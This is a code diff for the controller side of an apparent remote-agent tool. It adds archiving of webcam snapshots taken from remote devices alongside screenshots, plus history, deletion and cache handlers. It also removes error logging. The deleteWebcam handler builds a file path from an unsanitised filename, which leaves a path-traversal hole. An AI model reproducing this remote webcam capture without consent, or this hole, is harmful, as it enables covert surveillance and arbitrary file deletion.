@@ -7,14 +7,24 @@ use json
 import "../core/config.dz" as config
 import "../../Shared/constants.dz" as constants
 
-# Helper to get the screenshots storage directory for a device
-fn getStorageDir(deviceId)
+# Helpers for storage directories
+fn getScreenshotDir(deviceId)
     let safeId = deviceId.replace(":", "_").replace("/", "_").replace("\\", "_")
     let baseDir = "storage/screenshots/" + safeId
-    try
-        dir.createAll(baseDir)
-    catch e
-    end
+    try dir.createAll(baseDir) catch e end
+    return baseDir
+end
+
+fn getWebcamDir(deviceId)
+    let safeId = deviceId.replace(":", "_").replace("/", "_").replace("\\", "_")
+    let baseDir = "storage/webcam/" + safeId
+    try dir.createAll(baseDir) catch e end
+    return baseDir
+end
+
+fn getCacheDir()
+    let baseDir = "storage/cache"
+    try dir.createAll(baseDir) catch e end
     return baseDir
 end
 
@@ -22,7 +32,6 @@ end
 # @param {App} app - The WebView application instance.
 fn register(app)
     # Event: agentCommand
-    # Sends a command to a specific agent, receives the response, and archives screenshots if applicable.
     app.bridge.on("agentCommand", fn(payload)
         let ip = payload["ip"]
         let deviceId = if payload.has("id") and !isNull(payload["id"]) ? payload["id"] else ("KC-" + ip)
@@ -54,15 +63,29 @@ fn register(app)
             # Auto-archive screenshot to disk
             if cmdType == "SCREENSHOT" and response.startsWith("SCREENSHOT:")
                 let b64 = response.slice(11, response.length()).strip()
-                if b64 != ""
+                if b64 != "" and !b64.startsWith("ERR:")
                     try
-                        let storageDir = getStorageDir(deviceId)
+                        let storageDir = getScreenshotDir(deviceId)
                         let now = datetime.now()
                         let ts = str(now.year()) + "-" + str(now.month()) + "-" + str(now.day()) + "_" + str(now.hour()) + "-" + str(now.minute()) + "-" + str(now.second())
                         let filePath = storageDir + "/" + ts + ".b64"
                         file.write(filePath, b64)
                     catch e
-                        print("[Screenshots] Storage error: " + str(e))
+                    end
+                end
+            end
+
+            # Auto-archive webcam snapshot to disk
+            if cmdType == "WEBCAM" and response.startsWith("WEBCAM:")
+                let b64 = response.slice(7, response.length()).strip()
+                if b64 != "" and !b64.startsWith("ERR:")
+                    try
+                        let storageDir = getWebcamDir(deviceId)
+                        let now = datetime.now()
+                        let ts = str(now.year()) + "-" + str(now.month()) + "-" + str(now.day()) + "_" + str(now.hour()) + "-" + str(now.minute()) + "-" + str(now.second())
+                        let filePath = storageDir + "/" + ts + ".b64"
+                        file.write(filePath, b64)
+                    catch e
                     end
                 end
             end
@@ -74,7 +97,6 @@ fn register(app)
     end)
 
     # Event: getScreenshotHistory
-    # Retrieves all saved screenshots for a given device ID.
     app.bridge.on("getScreenshotHistory", fn(payload)
         let deviceId = payload
         if type(payload) == "Map" and payload.has("id")
@@ -109,7 +131,6 @@ fn register(app)
                 end
             end
         catch e
-            print("[Screenshots] History retrieval error: " + str(e))
         end
 
         # Reverse to have newest screenshots first
@@ -125,7 +146,6 @@ fn register(app)
     end)
 
     # Event: deleteScreenshot
-    # Deletes a saved screenshot file.
     app.bridge.on("deleteScreenshot", fn(payload)
         try
             let deviceId = payload["id"]
@@ -139,5 +159,104 @@ fn register(app)
         catch e
         end
         return False
+    end)
+
+    # Event: getWebcamHistory
+    app.bridge.on("getWebcamHistory", fn(payload)
+        let deviceId = payload
+        if type(payload) == "Map" and payload.has("id")
+            deviceId = payload["id"]
+        end
+        let safeId = deviceId.replace(":", "_").replace("/", "_").replace("\\", "_")
+        let storageDir = "storage/webcam/" + safeId
+        let history = []
+
+        try
+            if file.exists(storageDir)
+                let items = dir.list(storageDir)
+                for item in items
+                    if item.endsWith(".b64")
+                        let fullPath = storageDir + "/" + item
+                        let b64 = file.read(fullPath).strip()
+                        let nameWithoutExt = item.replace(".b64", "")
+                        let parts = nameWithoutExt.split("_")
+                        let timeLabel = nameWithoutExt
+                        if parts.length() >= 2
+                            let datePart = parts[0]
+                            let timePart = parts[1].replace("-", ":")
+                            timeLabel = datePart + " " + timePart
+                        end
+                        history.append({
+                            "id": item,
+                            "filename": item,
+                            "time": timeLabel,
+                            "b64": b64
+                        })
+                    end
+                end
+            end
+        catch e
+        end
+
+        let reversedHistory = []
+        let len = history.length()
+        let idx = len - 1
+        while idx >= 0
+            reversedHistory.append(history[idx])
+            idx -= 1
+        end
+
+        return reversedHistory
+    end)
+
+    # Event: deleteWebcam
+    app.bridge.on("deleteWebcam", fn(payload)
+        try
+            let deviceId = payload["id"]
+            let filename = payload["filename"]
+            let safeId = deviceId.replace(":", "_").replace("/", "_").replace("\\", "_")
+            let fullPath = "storage/webcam/" + safeId + "/" + filename
+            if file.isFile(fullPath)
+                file.delete(fullPath)
+                return True
+            end
+        catch e
+        end
+        return False
+    end)
+
+    # Event: saveDiskCache
+    app.bridge.on("saveDiskCache", fn(payload)
+        try
+            let deviceId = payload["id"]
+            let data = payload["data"]
+            let safeId = deviceId.replace(":", "_").replace("/", "_").replace("\\", "_")
+            let cacheDir = getCacheDir()
+            let filePath = cacheDir + "/" + safeId + ".json"
+            file.write(filePath, json.encode(data))
+            return True
+        catch e
+            return False
+        end
+    end)
+
+    # Event: loadDiskCache
+    app.bridge.on("loadDiskCache", fn(payload)
+        try
+            let deviceId = payload
+            if type(payload) == "Map" and payload.has("id")
+                deviceId = payload["id"]
+            end
+            let safeId = deviceId.replace(":", "_").replace("/", "_").replace("\\", "_")
+            let filePath = "storage/cache/" + safeId + ".json"
+            if file.isFile(filePath)
+                let content = file.read(filePath)
+                if content != ""
+                    return json.decode(content)
+                end
+            end
+        catch e
+        end
+        return Null
     end)
 end
